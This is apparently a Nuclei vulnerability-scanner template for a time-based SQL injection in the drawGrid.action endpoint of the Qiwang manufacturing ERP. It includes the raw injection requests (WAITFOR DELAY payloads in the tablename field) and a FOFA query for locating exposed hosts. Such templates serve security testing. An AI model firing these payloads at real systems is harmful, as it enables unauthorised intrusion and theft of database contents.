http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          POST /mainFunctions/drawGrid.action;cookieLogin.action HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
          Content-Type: application/x-www-form-urlencoded

          tablename=1';WAITFOR DELAY '0:0:4'--
        - |
          POST /mainFunctions/drawGrid.action;cookieLogin.action HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
          Content-Type: application/x-www-form-urlencoded

          tablename=1';WAITFOR DELAY '0:0:8'--
id: qiwangERP-drawGrid_action-sql
info:
    author: Superhero
    description: |-
        fofa: "staff/cookieLogin.action"
        企望制造ERP系统 drawGrid.action 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 企望制造ERP系统 drawGrid.action SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247489386&idx=1&sn=3c24e2c2b38b5df8b3e850eb205aead7&chksm=c267a259f5102b4ffa35ed2f010a0f6bb0e61999722ca89de4267544cf53520eb431c19320cf&token=279945389&lang=zh_CN#rd
    severity: high
    tags: []
